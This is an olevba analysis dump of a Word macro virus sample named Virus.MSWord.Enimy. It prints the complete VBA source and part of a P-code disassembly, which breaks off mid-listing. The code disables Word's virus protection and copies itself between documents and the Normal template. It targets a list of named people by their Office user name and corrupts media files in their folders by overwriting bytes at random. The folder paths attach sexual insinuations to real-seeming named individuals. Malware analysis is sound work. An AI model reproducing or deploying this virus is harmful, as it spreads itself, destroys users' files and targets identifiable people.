olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Enimy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Enimy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim acd, ntt As Object
Dim MyEnemy$(20, 1)
Dim MyPhoto$(10)
Dim MyVideo$(6)
Dim MyExten$(5)
Dim zw As Byte
Const mrk = "èó àèà èàåñè îòâðù îçêç îèñðâéÀ .ÂðñíïñíÔíðâêìñ îàèèï ààóÊìñàîî .Â"
Private Sub CommandButton1_Click()
ûðó
End Sub
Private Sub document_open()
 On Error Resume Next
 Options.VirusProtection = False
 Set acd = ActiveDocument.VBProject.VBComponents.Item(1)
 Set ntt = NormalTemplate.VBProject.VBComponents.Item(1)
 If Not acd.CodeModule.Find(mrk, 1, 1, 1000, 1000) Then acd.CodeModule.DeleteLines 1, acd.CodeModule.CountOfLines
 If Not ntt.CodeModule.Find(mrk, 1, 1, 1000, 1000) Then ntt.CodeModule.DeleteLines 1, ntt.CodeModule.CountOfLines
End Sub
Private Sub document_close()
 On Error Resume Next
 Options.VirusProtection = False
 Set acd = ActiveDocument.VBProject.VBComponents.Item(1)
 Set ntt = NormalTemplate.VBProject.VBComponents.Item(1)
 s$ = ""
 If (acd.CodeModule.CountOfLines <= 1) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
  v2 = 1
  For v = 1 To ntt.CodeModule.CountOfLines
   s$ = ntt.CodeModule.lines(v, 1)
   If s$ <> "" Then
    acd.CodeModule.insertlines v2, s$
    v2 = v2 + 1
   End If
  Next v
 End If
 ActiveDocument.Save
 If ntt.CodeModule.CountOfLines <= 1 Then
  v2 = 1
  For v = 1 To acd.CodeModule.CountOfLines
   s$ = acd.CodeModule.lines(v, 1)
   If s$ <> "" Then
    ntt.CodeModule.insertlines v2, s$
    v2 = v2 + 1
   End If
  Next v
 End If
 NormalTemplate.Save
 'Retaliate
 MyEnemy$(0, 0) = "Ôðîëîâ Î. À."
 MyEnemy$(1, 0) = "Åìåëüÿíåíêî Â. Â."
 MyEnemy$(2, 0) = "Ïîäãîðíîâà Å. È."
 MyEnemy$(3, 0) = "Ìàòðîñîâà Îëüãà Åâãåíüåâíà"
 MyEnemy$(4, 0) = "Êîâàëåâà Î Þ"
 MyEnemy$(5, 0) = "Ìîñèí Ê. Ï."
 MyEnemy$(6, 0) = "Øàëûãèí Ï. Ñ."
 MyEnemy$(7, 0) = "Ëèõòåð Àíàòîëèé Ìèõàéëîâè÷"
 MyEnemy$(8, 0) = "À. Ì. Êàðïîâ"
 MyEnemy$(9, 0) = "Êîçëîâ Àíäðåé Àëåêñàíäðîâè÷"
 MyEnemy$(10, 0) = "Ïàâëîâà Îëüãà"
 MyEnemy$(11, 0) = "Äìèòðèåâ Ñåðãåé"
 MyEnemy$(12, 0) = "Bob Klein"
 MyEnemy$(13, 0) = "Jim Rein"
 MyEnemy$(14, 0) = "John A. Hopkins"
 MyEnemy$(15, 0) = "Garry Wood"
 MyEnemy$(17, 0) = "Debra Henriksen"
 MyEnemy$(18, 0) = "Patricia "
 MyEnemy$(19, 0) = "Hitler"
 
 For v = 0 To 19
  If (v <= 11) Or (v = 19) Then
   MyEnemy$(v, 1) = "C:\Ìîè äîêóìåíòû"
  Else
   MyEnemy$(v, 1) = "C:\My documents"
  End If
 Next v
 MyEnemy$(0, 1) = MyEnemy$(0, 1) + "\Òðàõàíüå\"
 MyEnemy$(1, 1) = MyEnemy$(1, 1) + "\Ïîðíî\"
 MyEnemy$(2, 1) = MyEnemy$(2, 1) + "\Ñåêñ\"
 MyEnemy$(3, 1) = MyEnemy$(3, 1) + "\Èçâðàùåíèÿ\"
 MyEnemy$(4, 1) = MyEnemy$(4, 1) + "\Òðàõ\"
 MyEnemy$(5, 1) = MyEnemy$(5, 1) + "\Êëóáíè÷êà\"
 MyEnemy$(6, 1) = MyEnemy$(6, 1) + "\Äåâóøêè\Ãåëÿ\"
 MyEnemy$(7, 1) = MyEnemy$(7, 1) + "\Ôîòêè äåâóøåê\Êîìèññàðîâà Àíãåëèíà Âèòàëüåâíà\"
 MyEnemy$(8, 1) = "C:\Òîëüêî äëÿ ìåíÿ\Ïîðíóõà\Ãåëêà\"
 MyEnemy$(9, 1) = MyEnemy$(9, 1) + "\Îáíàæåííàÿ íàòóðà\Àíãåëèíà\"
 MyEnemy$(10, 1) = MyEnemy$(10, 1) + "\Ñåêñ_êîëëåêöèÿ\Êîìèññàðîâà_À_Â\"
 MyEnemy$(11, 1) = MyEnemy$(11, 1) + "\Ëó÷øèå ïîïêè ãîðîäà\"
 MyEnemy$(12, 1) = MyEnemy$(12, 1) + "\Russian Porno\"
 MyEnemy$(13, 1) = MyEnemy$(13, 1) + "\Russian Girls\Comissarova\"
 MyEnemy$(14, 1) = MyEnemy$(14, 1) + "\Russian Fuck\Gelka"
 MyEnemy$(15, 1) = MyEnemy$(15, 1) + "\Nudo\G\"
 MyEnemy$(16, 1) = MyEnemy$(16, 1) + "\Sex Show 1\Gela\"
 MyEnemy$(17, 1) = MyEnemy$(17, 1) + "\Sex Collection\"
 MyEnemy$(18, 1) = MyEnemy$(18, 1) + "\Crazy Sex\"
 MyEnemy$(19, 1) = MyEnemy$(19, 1) + "\Âûñòàâêà ñåêñà\Ðîññèÿ\Àñòðàõàíü\"
 
 MyPhoto$(0) = "Angelina"
 MyPhoto$(1) = "Gela"
 MyPhoto$(2) = "Body_A"
 MyPhoto$(3) = "Fuck"
 MyPhoto$(4) = "Fuck_ass"
 MyPhoto$(5) = "Ass"
 MyPhoto$(6) = "Cnt"
 MyPhoto$(7) = "Klzm"
 MyPhoto$(8) = "Kk"
 MyPhoto$(9) = "Urn"
 
 MyVideo$(0) = "Gela&Seryj"
 MyVideo$(1) = "Gela&Vlad"
 MyVideo$(2) = "Gela&Tolja"
 MyVideo$(3) = "Gela&Oleg"
 MyVideo$(4) = "Gela_Urn"
 MyVideo$(5) = "Gela_Alone"
 
 MyExten$(0) = "jpg"
 MyExten$(1) = "gif"
 MyExten$(2) = "tif"
 MyExten$(3) = "avi"
 MyExten$(4) = "mpg"
 vic$ = ""
 On Error GoTo exit_
 FileNumber = FreeFile
 For en = 0 To 19
  If Application.UserName = MyEnemy$(en, 0) Then
   For vic_name = 0 To 15
    For vic_ext = 0 To 4
     For p_number = 0 To 40
      If vic_name <= 9 Then
       vic$ = MyPhoto$(vic_name)
      Else
       vic$ = MyVideo$(vic_name - 10)
      End If
      s$ = Trim(Str(p_number))
      While Len(s$) < 3
       s$ = "0" + s$
      Wend
      vic$ = vic$ + s$ + "." + MyExten$(vic_ext)
      Open MyEnemy$(en, 1) + vic$ For Input As #FileNumber
      Close #FileNumber
      Open MyEnemy$(en, 1) + vic$ For Binary Access Read Write As #FileNumber Len = 1
      pos = 0
      While Not EOF(FileNumber)
       pos = pos + 1
       Get #FileNumber, pos, zw
       If (Rnd > 0.35) And (Not EOF(FileNumber)) Then
        zw = Int(256 * Rnd)
        Put #FileNumber, pos, zw
       End If
      Wend
      Close #FileNumber
exit_: Resume h
h:
     Next p_number
    Next vic_ext
   Next vic_name
  End If
 Next en
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Enimy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14825 bytes
' Line #0:
' 	Dim 
' 	VarDefn acd
' 	VarDefn ntt (As Object)
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0014 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn MyEnemy
' Line #2:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn MyPhoto
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0006 
' 	VarDefn MyVideo
' Line #4:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0005 
' 	VarDefn MyExten
' Line #5:
' 	Dim 
' 	VarDefn zw (As Byte)
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x0042 "èó àèà èàåñè îòâðù îçêç îèñðâéÀ .ÂðñíïñíÔíðâêìñ îàèèï ààóÊìñàîî .Â"
' 	VarDefn mrk
' Line #7:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #8:
' 	ArgsCall ûðó 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub document_open())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set acd 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ntt 
' Line #15:
' 	Ld mrk 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	Ld acd 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld acd 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld acd 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #16:
' 	Ld mrk 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	Ld ntt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ntt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ntt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub document_close())
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set acd 
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ntt 
' Line #23:
' 	LitStr 0x0000 ""
' 	St s$ 
' Line #24:
' 	Ld acd 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Le 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	St v2 
' Line #26:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ntt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #27:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ntt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St s$ 
' Line #28:
' 	Ld s$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld v2 
' 	Ld s$ 
' 	Ld acd 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #30:
' 	Ld v2 
' 	LitDI2 0x0001 
' 	Add 
' 	St v2 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	Ld ntt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Le 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	St v2 
' Line #37:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld acd 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #38:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld acd 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St s$ 
' Line #39:
' 	Ld s$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #40:
' 	Ld v2 
' 	Ld s$ 
' 	Ld ntt 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #41:
' 	Ld v2 
' 	LitDI2 0x0001 
' 	Add 
' 	St v2 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #46:
' 	QuoteRem 0x0001 0x0009 "Retaliate"
' Line #47:
' 	LitStr 0x000C "Ôðîëîâ Î. À."
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #48:
' 	LitStr 0x0011 "Åìåëüÿíåíêî Â. Â."
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #49:
' 	LitStr 0x0010 "Ïîäãîðíîâà Å. È."
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #50:
' 	LitStr 0x001A "Ìàòðîñîâà Îëüãà Åâãåíüåâíà"
' 	LitDI2 0x0003 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #51:
' 	LitStr 0x000C "Êîâàëåâà Î Þ"
' 	LitDI2 0x0004 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #52:
' 	LitStr 0x000B "Ìîñèí Ê. Ï."
' 	LitDI2 0x0005 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #53:
' 	LitStr 0x000D "Øàëûãèí Ï. Ñ."
' 	LitDI2 0x0006 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #54:
' 	LitStr 0x001A "Ëèõòåð Àíàòîëèé Ìèõàéëîâè÷"
' 	LitDI2 0x0007 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #55:
' 	LitStr 0x000C "À. Ì. Êàðïîâ"
' 	LitDI2 0x0008 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #56:
' 	LitStr 0x001B "Êîçëîâ Àíäðåé Àëåêñàíäðîâè÷"
' 	LitDI2 0x0009 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #57:
' 	LitStr 0x000D "Ïàâëîâà Îëüãà"
' 	LitDI2 0x000A 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #58:
' 	LitStr 0x000F "Äìèòðèåâ Ñåðãåé"
' 	LitDI2 0x000B 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #59:
' 	LitStr 0x0009 "Bob Klein"
' 	LitDI2 0x000C 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #60:
' 	LitStr 0x0008 "Jim Rein"
' 	LitDI2 0x000D 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #61:
' 	LitStr 0x000F "John A. Hopkins"
' 	LitDI2 0x000E 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #62:
' 	LitStr 0x000A "Garry Wood"
' 	LitDI2 0x000F 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #63:
' 	LitStr 0x000F "Debra Henriksen"
' 	LitDI2 0x0011 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #64:
' 	LitStr 0x0009 "Patricia "
' 	LitDI2 0x0012 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #65:
' 	LitStr 0x0006 "Hitler"
' 	LitDI2 0x0013 
' 	LitDI2 0x0000 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #66:
' Line #67:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0013 
' 	For 
' Line #68:
' 	Ld v 
' 	LitDI2 0x000B 
' 	Le 
' 	Paren 
' 	Ld v 
' 	LitDI2 0x0013 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #69:
' 	LitStr 0x0010 "C:\Ìîè äîêóìåíòû"
' 	Ld v 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #70:
' 	ElseBlock 
' Line #71:
' 	LitStr 0x000F "C:\My documents"
' 	Ld v 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000A "\Òðàõàíüå\"
' 	Add 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0007 "\Ïîðíî\"
' 	Add 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #76:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0006 "\Ñåêñ\"
' 	Add 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #77:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000C "\Èçâðàùåíèÿ\"
' 	Add 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #78:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0006 "\Òðàõ\"
' 	Add 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #79:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000B "\Êëóáíè÷êà\"
' 	Add 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #80:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000E "\Äåâóøêè\Ãåëÿ\"
' 	Add 
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #81:
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x002F "\Ôîòêè äåâóøåê\Êîìèññàðîâà Àíãåëèíà Âèòàëüåâíà\"
' 	Add 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #82:
' 	LitStr 0x0021 "C:\Òîëüêî äëÿ ìåíÿ\Ïîðíóõà\Ãåëêà\"
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #83:
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x001C "\Îáíàæåííàÿ íàòóðà\Àíãåëèíà\"
' 	Add 
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #84:
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0020 "\Ñåêñ_êîëëåêöèÿ\Êîìèññàðîâà_À_Â\"
' 	Add 
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #85:
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0015 "\Ëó÷øèå ïîïêè ãîðîäà\"
' 	Add 
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #86:
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000F "\Russian Porno\"
' 	Add 
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #87:
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x001B "\Russian Girls\Comissarova\"
' 	Add 
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #88:
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0013 "\Russian Fuck\Gelka"
' 	Add 
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #89:
' 	LitDI2 0x000F 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0008 "\Nudo\G\"
' 	Add 
' 	LitDI2 0x000F 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #90:
' 	LitDI2 0x0010 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0011 "\Sex Show 1\Gela\"
' 	Add 
' 	LitDI2 0x0010 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #91:
' 	LitDI2 0x0011 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0010 "\Sex Collection\"
' 	Add 
' 	LitDI2 0x0011 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #92:
' 	LitDI2 0x0012 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x000B "\Crazy Sex\"
' 	Add 
' 	LitDI2 0x0012 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #93:
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	LitStr 0x0021 "\Âûñòàâêà ñåêñà\Ðîññèÿ\Àñòðàõàíü\"
' 	Add 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsSt MyEnemy$ 0x0002 
' Line #94:
' Line #95:
' 	LitStr 0x0008 "Angelina"
' 	LitDI2 0x0000 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #96:
' 	LitStr 0x0004 "Gela"
' 	LitDI2 0x0001 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #97:
' 	LitStr 0x0006 "Body_A"
' 	LitDI2 0x0002 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #98:
' 	LitStr 0x0004 "Fuck"
' 	LitDI2 0x0003 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #99:
' 	LitStr 0x0008 "Fuck_ass"
' 	LitDI2 0x0004 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #100:
' 	LitStr 0x0003 "Ass"
' 	LitDI2 0x0005 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #101:
' 	LitStr 0x0003 "Cnt"
' 	LitDI2 0x0006 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #102:
' 	LitStr 0x0004 "Klzm"
' 	LitDI2 0x0007 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #103:
' 	LitStr 0x0002 "Kk"
' 	LitDI2 0x0008 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #104:
' 	LitStr 0x0003 "Urn"
' 	LitDI2 0x0009 
' 	ArgsSt MyPhoto$ 0x0001 
' Line #105:
' Line #106:
' 	LitStr 0x000A "Gela&Seryj"
' 	LitDI2 0x0000 
' 	ArgsSt MyVideo$ 0x0001 
' Line #107:
' 	LitStr 0x0009 "Gela&Vlad"
' 	LitDI2 0x0001 
' 	ArgsSt MyVideo$ 0x0001 
' Line #108:
' 	LitStr 0x000A "Gela&Tolja"
' 	LitDI2 0x0002 
' 	ArgsSt MyVideo$ 0x0001 
' Line #109:
' 	LitStr 0x0009 "Gela&Oleg"
' 	LitDI2 0x0003 
' 	ArgsSt MyVideo$ 0x0001 
' Line #110:
' 	LitStr 0x0008 "Gela_Urn"
' 	LitDI2 0x0004 
' 	ArgsSt MyVideo$ 0x0001 
' Line #111:
' 	LitStr 0x000A "Gela_Alone"
' 	LitDI2 0x0005 
' 	ArgsSt MyVideo$ 0x0001 
' Line #112:
' Line #113:
' 	LitStr 0x0003 "jpg"
' 	LitDI2 0x0000 
' 	ArgsSt MyExten$ 0x0001 
' Line #114:
' 	LitStr 0x0003 "gif"
' 	LitDI2 0x0001 
' 	ArgsSt MyExten$ 0x0001 
' Line #115:
' 	LitStr 0x0003 "tif"
' 	LitDI2 0x0002 
' 	ArgsSt MyExten$ 0x0001 
' Line #116:
' 	LitStr 0x0003 "avi"
' 	LitDI2 0x0003 
' 	ArgsSt MyExten$ 0x0001 
' Line #117:
' 	LitStr 0x0003 "mpg"
' 	LitDI2 0x0004 
' 	ArgsSt MyExten$ 0x0001 
' Line #118:
' 	LitStr 0x0000 ""
' 	St vic$ 
' Line #119:
' 	OnError exit_ 
' Line #120:
' 	Ld Friend 
' 	St FileNumber 
' Line #121:
' 	StartForVariable 
' 	Ld en 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0013 
' 	For 
' Line #122:
' 	Ld Application 
' 	MemLd UserName 
' 	Ld en 
' 	LitDI2 0x0000 
' 	ArgsLd MyEnemy$ 0x0002 
' 	Eq 
' 	IfBlock 
' Line #123:
' 	StartForVariable 
' 	Ld vic_name 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x000F 
' 	For 
' Line #124:
' 	StartForVariable 
' 	Ld vic_ext 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #125:
' 	StartForVariable 
' 	Ld p_number 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0028 
' 	For 
' Line #126:
' 	Ld vic_name 
' 	LitDI2 0x0009 
' 	Le 
' 	IfBlock 
' Line #127:
' 	Ld vic_name 
' 	ArgsLd MyPhoto$ 0x0001 
' 	St vic$ 
' Line #128:
' 	ElseBlock 
' Line #129:
' 	Ld vic_name 
' 	LitDI2 0x000A 
' 	Sub 
' 	ArgsLd MyVideo$ 0x0001 
' 	St vic$ 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	Ld p_number 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Trim 0x0001 
' 	St s$ 
' Line #132:
' 	Ld s$ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Lt 
' 	While 
' Line #133:
' 	LitStr 0x0001 "0"
' 	Ld s$ 
' 	Add 
' 	St s$ 
' Line #134:
' 	Wend 
' Line #135:
' 	Ld vic$ 
' 	Ld s$ 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	Ld vic_ext 
' 	ArgsLd MyExten$ 0x0001 
' 	Add 
' 	St vic$ 
' Line #136:
' 	Ld en 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	Ld vic$ 
' 	Add 
' 	Ld FileNumber 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #137:
' 	Ld FileNumber 
' 	Sharp 
' 	Close 0x0001 
' Line #138:
' 	Ld en 
' 	LitDI2 0x0001 
' 	ArgsLd MyEnemy$ 0x0002 
' 	Ld vic$ 
' 	Add 
' 	Ld FileNumber 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Open (For Binary Access Read Write)
' Line #139:
' 	LitDI2 0x0000 
' 	St pos 
' Line #140:
' 	Ld FileNumber 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #141:
' 	Ld pos 
' 	LitDI2 0x0001 
' 	Add 
' 	St pos 
' Line #142:
' 	Ld FileNumber 
' 	Sharp 
